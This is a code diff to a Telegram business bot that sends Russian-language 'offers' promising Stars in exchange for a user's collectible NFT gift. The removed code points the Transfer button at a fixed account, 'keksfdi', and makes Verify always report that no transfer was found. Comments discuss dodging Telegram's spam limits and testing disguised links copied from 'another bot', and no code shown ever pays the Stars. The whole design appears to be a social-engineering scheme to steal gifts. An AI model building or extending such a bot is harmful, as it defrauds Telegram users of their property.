@@ -74,7 +74,7 @@ def parse_offer(text: str):
         title += f" #{number.group(1)}"
     return {"url": url, "amount": amount, "title": title}
 
-def remaining(expires_at, language="ru"):
+def remaining(expires_at):
     try:
         end = datetime.fromisoformat(expires_at)
         sec = max(0, int((end - utcnow()).total_seconds()))
@@ -82,10 +82,6 @@ def remaining(expires_at, language="ru"):
         sec = 0
     hours, sec = divmod(sec, 3600)
     mins = sec // 60
-    if (language or "ru").lower() == "eng":
-        hour_label = "hr" if hours == 1 else "hrs"
-        min_label = "min" if mins == 1 else "mins"
-        return f"{hours} {hour_label} {mins:02d} {min_label}"
     return f"{hours} ч. {mins:02d} мин."
 
 # Telegram custom emoji IDs supplied for this bot.
@@ -104,59 +100,50 @@ def offer_text(d):
     star_emoji = tg_emoji(EMOJI_STAR, "⭐")
     accept_emoji = tg_emoji(EMOJI_ACCEPT, "✅")
     cancel_emoji = tg_emoji(EMOJI_CANCEL, "❌")
-    lang = (d.get("language") or "ru").lower()
-    english = lang == "eng"
+    # Скрытая ссылка (<a href>) с другим текстом вызывает PEER_FLOOD — выводим адрес как есть.
     gift_title = escape(d["gift_title"])
     gift_url = escape(d["gift_url"])
     amount = f'{int(d["amount"]):,}'.replace(",", " ")
-    user = escape(d["creator_name"] or ("User" if english else "Пользователь"))
+    user = escape(d["creator_name"] or "Пользователь")
     if d["status"] == "PENDING":
-        if english:
-            return (f"{gift_emoji} <b>{user} has made you an offer</b>\n"
-                    f"<b>{amount} {star_emoji} for the gift {gift_title}</b>\n"
-                    f"{gift_url}\n\n"
-                    f"This offer expires in <b>{remaining(d['expires_at'], lang)}</b>.")
-        return (f"{gift_emoji} <b>{user} предлагает вам</b>\n"
-                f"<b>{amount} {star_emoji} за подарок {gift_title}</b>\n"
-                f"{gift_url}\n\n"
-                f"Предложение действительно ещё <b>{remaining(d['expires_at'], lang)}</b>.")
+        return (
+            f"{gift_emoji} <b>{user} предлагает вам</b>\n"
+            f"<b>{amount} {star_emoji} за подарок {gift_title}</b>\n"
+            f"{gift_url}\n\n"
+            f"Предложение действует ещё <b>{remaining(d['expires_at'])}</b>."
+        )
     if d["status"] == "ACCEPTED":
-        if english:
-            return (f"{accept_emoji} <b>Offer accepted</b>\n\n"
-                    f"{amount} {star_emoji} for the gift {gift_title}\n{gift_url}\n\n"
-                    "Gift transfer is pending. The status will update after the transfer is independently verified.")
-        return (f"{accept_emoji} <b>Предложение принято</b>\n\n"
-                f"{amount} {star_emoji} за подарок {gift_title}\n{gift_url}\n\n"
-                "Ожидается передача подарка. Статус обновится после независимого подтверждения передачи.")
+        return (
+            f"{accept_emoji} <b>Предложение принято</b>\n\n"
+            f"{amount} {star_emoji} за подарок {gift_title}\n"
+            f"{gift_url}\n\n"
+            "Ожидается фактическая передача подарка. "
+            "После независимой проверки передачи статус сделки обновится."
+        )
     if d["status"] == "REJECTED":
-        return f"{cancel_emoji} <b>{'Offer declined' if english else 'Сделка отменена — предложение отклонено'}</b>."
+        return f"{cancel_emoji} <b>Сделка отменена</b> — предложение отклонено."
     if d["status"] == "CANCELLED":
-        return f"{cancel_emoji} <b>{'Deal cancelled.' if english else 'Сделка отменена.'}</b>"
+        return f"{cancel_emoji} <b>Сделка отменена.</b>"
     if d["status"] == "EXPIRED":
-        return f"⌛ <b>{'This offer has expired.' if english else 'Срок действия предложения истёк.'}</b>"
+        return "⌛ <b>Срок действия предложения истёк.</b>"
     if d["status"] == "COMPLETED":
-        status = "Gift transfer confirmed." if english else "Передача подарка подтверждена проверкой."
-        return f"{accept_emoji} <b>{status}</b>\n{gift_url}"
-    return "Unknown deal status." if english else "Статус сделки неизвестен."
+        return f"{accept_emoji} <b>Передача подарка {gift_title} подтверждена проверкой.</b>\n{gift_url}"
+    return "Статус сделки неизвестен."
 
 def keyboard_for(d, recipient=None):
     deal_id = d["id"]
-    lang = (d.get("language") or "ru").lower()
-    if lang not in {"ru", "eng"}:
-        lang = "ru"
     if d["status"] == "PENDING":
-        accept_text, reject_text = (("Accept", "⊗ Reject") if lang == "eng" else ("Принять", "⊗ Отклонить"))
         return InlineKeyboardMarkup(inline_keyboard=[[
-            InlineKeyboardButton(text=accept_text, callback_data=f"accept:{deal_id}",
-                                 icon_custom_emoji_id=EMOJI_BTN_TRANSFER),
-            InlineKeyboardButton(text=reject_text, callback_data=f"reject:{deal_id}")
+            InlineKeyboardButton(text="☑ Принять", callback_data=f"accept:{deal_id}"),
+            InlineKeyboardButton(text="⊗ Отклонить", callback_data=f"reject:{deal_id}")
         ]])
     if d["status"] == "ACCEPTED":
-        transfer_text, verify_text = (("Transfer", "Verify") if lang == "eng" else ("Передать", "Проверить"))
+        username = (recipient or "").strip().lstrip("@")
+        transfer_url = f"https://t.me/{username}" if username else "https://t.me/"
         return InlineKeyboardMarkup(inline_keyboard=[[
-            InlineKeyboardButton(text=transfer_text, url="tg://send_gift?to=keksfdi",
+            InlineKeyboardButton(text="Передать", url=transfer_url,
                                  icon_custom_emoji_id=EMOJI_BTN_TRANSFER),
-            InlineKeyboardButton(text=verify_text, callback_data=f"verify:{deal_id}",
+            InlineKeyboardButton(text="Проверить", callback_data=f"verify:{deal_id}",
                                  icon_custom_emoji_id=EMOJI_BTN_VERIFY)
         ]])
     return None
@@ -254,15 +241,7 @@ async def _create_offer(message: Message, bot: Bot, *, business_connection_id: s
     # реагируем только на сообщения админов, иначе Telegram режет аккаунт за спам.
     if business_connection_id and not await is_admin(message.from_user.id):
         return
-    # Optional final token selects the offer language: ... 444 stars eng|ru.
-    # Strip it before parsing so it cannot interfere with the amount/link parser.
-    source_text = (message.text or "").strip()
-    tokens = source_text.split()
-    language = "ru"
-    if tokens and tokens[-1].lower() in {"ru", "eng"}:
-        language = tokens.pop().lower()
-        source_text = " ".join(tokens)
-    parsed = parse_offer(source_text)
+    parsed = parse_offer(message.text or "")
     if not parsed:
         return
     if not business_connection_id or OFFER_MODE in ("send", "replace"):
@@ -286,7 +265,6 @@ async def _create_offer(message: Message, bot: Bot, *, business_connection_id: s
         gift_title=parsed["title"],
         amount=parsed["amount"],
         expires_at=iso(expiry),
-        language=language,
     )
     d = await get_deal(deal_id)
     recipient = await get_setting("recipient_username")
@@ -552,94 +530,43 @@ async def business_diag4(message: Message, bot: Bot):
 
 @router.business_message(F.text.func(lambda t: t.strip().lower().startswith("/diag5")))
 async def business_diag5(message: Message, bot: Bot):
-    """/diag5 URL AMOUNT — send a NEW offer message, then delete the command."""
+    """Проверка конкретной ссылки/суммы: /diag5 https://t.me/nft/InstantRamen-181091 444"""
     cid = getattr(message, "business_connection_id", None)
     if not cid or not message.from_user or not await is_admin(message.from_user.id):
         return
-
-    args = re.sub(r"^/diag5(?:@\w+)?\s*", "", message.text or "", count=1, flags=re.I).strip()
-    tokens = args.split()
-    language = "ru"
-    if tokens and tokens[-1].lower() in {"ru", "eng"}:
-        language = tokens.pop().lower()
-    args_without_language = " ".join(tokens)
-    parse_input = args_without_language if re.search(r"\bstars?\b", args_without_language, re.I) else f"{args_without_language} stars"
-    parsed = parse_offer(parse_input)
+    parsed = parse_offer(message.text.replace("/diag5", "", 1).strip() + " stars" if "stars" not in message.text.lower() else message.text.replace("/diag5", "", 1))
     if not parsed:
-        # Leave the command in place if its arguments are invalid, and explain the format.
-        try:
-            await bot.send_message(
-                chat_id=message.chat.id,
-                business_connection_id=cid,
-                text=("Format: /diag5 https://t.me/nft/InstantRamen-181091 444 eng" if language == "eng"
-                      else "Формат: /diag5 https://t.me/nft/InstantRamen-181091 444 ru"),
-                parse_mode=None,
-            )
-        except Exception as exc:
-            logging.warning("DIAG5: не удалось отправить подсказку формата: %r", exc)
+        await bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id, business_connection_id=cid,
+                                    text="Формат: /diag5 https://t.me/nft/InstantRamen-181091 444", parse_mode=None)
         return
-
-    expiry = utcnow() + timedelta(hours=DEAL_HOURS)
-    creator = message.from_user.full_name or message.from_user.username or "Пользователь"
-    deal_id = await create_deal(
-        chat_id=message.chat.id,
-        message_id=message.message_id,  # replaced with the new offer's ID below
-        business_connection_id=cid,
-        creator_id=message.from_user.id,
-        creator_name=creator,
-        gift_url=parsed["url"],
-        gift_title=parsed["title"],
-        amount=parsed["amount"],
-        expires_at=iso(expiry),
-        language=language,
-    )
-    deal = await get_deal(deal_id)
-    deal["language"] = language
-    recipient = await get_setting("recipient_username")
-
-    amount_text = f'{int(parsed["amount"]):,}'.replace(",", " ")
-    if language == "eng":
-        hidden_text = (
-            f"{tg_emoji(EMOJI_GIFT, '🎁')} <b>{escape(creator)} has made you an offer</b>\n"
-            f"<b>{amount_text} {tg_emoji(EMOJI_STAR, '⭐')} for the gift "
-            f'<a href="{escape(parsed["url"], quote=True)}">{escape(parsed["title"])}</a></b>\n\n'
-            f"This offer expires in <b>{remaining(deal['expires_at'], language)}</b>."
-        )
-    else:
-        hidden_text = (
-            f"{tg_emoji(EMOJI_GIFT, '🎁')} <b>{escape(creator)} предлагает вам</b>\n"
-            f"<b>{amount_text} {tg_emoji(EMOJI_STAR, '⭐')} за подарок "
-            f'<a href="{escape(parsed["url"], quote=True)}">{escape(parsed["title"])}</a></b>\n\n'
-            f"Предложение действительно ещё <b>{remaining(deal['expires_at'], language)}</b>."
-        )
-    try:
-        # First send the replacement offer. Only after success do we remove the command.
-        sent = await bot.send_message(
-            chat_id=message.chat.id,
-            business_connection_id=cid,
-            text=hidden_text,
-            reply_markup=keyboard_for(deal, recipient),
-            disable_web_page_preview=True,
-        )
-        await update_deal(deal_id, message_id=sent.message_id)
+    fake = {"id": 0, "status": "PENDING", "gift_url": parsed["url"], "gift_title": parsed["title"],
+            "amount": parsed["amount"], "creator_name": message.from_user.full_name or "Тест",
+            "expires_at": iso(utcnow() + timedelta(hours=DEAL_HOURS))}
+    kb = keyboard_for(fake)
+    hidden = (f"{escape(fake['creator_name'])} предлагает вам\n{fake['amount']} ⭐ за подарок "
+              f'<a href="{escape(parsed["url"], quote=True)}">{escape(parsed["title"])}</a>.\n\nПредложение действует ещё 5 ч.')
+    tests = [("1 оффер как в боте", dict(text=offer_text(fake), reply_markup=kb)),
+             ("2 скрытая ссылка, как у другого бота", dict(text=hidden, reply_markup=kb))]
+    results, sent_ids = [], []
+    for name, kw in tests:
         try:
-            await bot.delete_message(
-                chat_id=message.chat.id,
-                message_id=message.message_id,
-                business_connection_id=cid,
-            )
+            m = await bot.send_message(chat_id=message.chat.id, business_connection_id=cid, **kw)
+            sent_ids.append(m.message_id)
+            results.append(f"✅ {name}")
         except Exception as exc:
-            # Offer is already posted; don't cancel it if Telegram refuses deletion.
-            logging.warning("DIAG5: offer sent as message_id=%s, but command deletion failed: %r", sent.message_id, exc)
-        logging.info("DIAG5: sent new offer deal_id=%s message_id=%s url=%s amount=%s",
-                     deal_id, sent.message_id, parsed["url"], parsed["amount"])
+            results.append(f"❌ {name}: {str(exc)[:60]}")
+        await asyncio.sleep(3)
+    logging.info("DIAG5 (%s, %s): %s", parsed["url"], parsed["amount"], " | ".join(results))
+    try:
+        if sent_ids:
+            await bot.delete_business_messages(business_connection_id=cid, message_ids=sent_ids)
     except Exception as exc:
-        logging.exception("DIAG5: could not send new offer: %r", exc)
-        await update_deal(
-            deal_id,
-            status="CANCELLED",
-            verification_note=f"Could not send /diag5 offer: {str(exc)[:250]}",
-        )
+        logging.warning("DIAG5: не удалось удалить тестовые сообщения: %r", exc)
+    try:
+        await bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id,
+                                    text="DIAG5\n" + "\n".join(results), business_connection_id=cid, parse_mode=None)
+    except Exception as exc:
+        logging.warning("DIAG5: не удалось показать результат: %r", exc)
 
 
 @router.business_message(F.text)
@@ -652,13 +579,11 @@ async def create_business_offer(message: Message, bot: Bot):
 
 @router.callback_query(F.data.startswith(("accept:", "reject:", "verify:")))
 async def callbacks(call: CallbackQuery, bot: Bot):
-    # Verify shows a localized alert; other actions are acknowledged immediately.
-    action_hint = (call.data or "").split(":", 1)[0]
-    if action_hint != "verify":
-        try:
-            await call.answer()
-        except Exception as exc:
-            logging.warning("Callback acknowledgement failed (continuing): %r", exc)
+    # Acknowledge immediately; database and edit calls may take longer than Telegram's callback window.
+    try:
+        await call.answer()
+    except Exception as exc:
+        logging.warning("Callback acknowledgement failed (continuing): %r", exc)
 
     try:
         action, raw_id = (call.data or "").split(":", 1)
@@ -701,18 +626,17 @@ async def callbacks(call: CallbackQuery, bot: Bot):
         return
 
     if action == "verify":
-        lang = (d.get("language") or "ru").lower()
-        if lang == "eng":
-            alert = ("Gift transfer has not been detected yet. Please send the gift using the Transfer button, "
-                     "then try verification again.")
+        if d["status"] != "ACCEPTED":
+            return
+        recipient = await get_setting("recipient_username")
+        result = await verify_gift_transfer(d["gift_url"], recipient, d)
+        if result.status == VerificationStatus.CONFIRMED:
+            await update_deal(deal_id, status="COMPLETED", verification_note=result.message)
+            await render(bot, await get_deal(deal_id))
+        elif result.status == VerificationStatus.NOT_FOUND:
+            logging.info("Gift transfer not found yet for deal_id=%s", deal_id)
         else:
-            alert = ("Передача подарка пока не подтверждена. Пожалуйста, отправьте подарок через кнопку «Передать», "
-                     "затем повторите проверку.")
-        try:
-            await call.answer(alert, show_alert=True)
-        except Exception as exc:
-            logging.warning("Could not show verification alert for deal_id=%s: %r", deal_id, exc)
-        return
+            logging.warning("Could not verify transfer for deal_id=%s: %s", deal_id, result.message)
 
 async def ticker(bot):
     while True:
